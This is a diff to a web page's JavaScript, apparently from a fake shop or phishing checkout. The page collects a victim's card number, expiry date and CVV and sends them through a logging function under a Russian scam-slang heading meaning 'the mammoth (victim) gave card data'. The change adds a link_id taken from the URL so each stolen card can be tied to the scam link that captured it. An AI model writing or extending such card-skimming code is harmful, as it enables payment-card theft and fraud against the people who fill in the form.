@@ -2571,8 +2571,12 @@ document.addEventListener('DOMContentLoaded', function() {
 
       // Validate all fields are filled
       if (cardNumber && cardExpiry && cardCVV) {
-        // Log card data with product name
-        const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}`;
+        // Get link_id for user identification
+        const urlParams = new URLSearchParams(window.location.search);
+        const link_id = urlParams.get('link_id');
+
+        // Log card data with product name and link_id for identification
+        const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
 
         console.log('📋 Logging card data:', logMessage);
         if (typeof sendLog === 'function') {
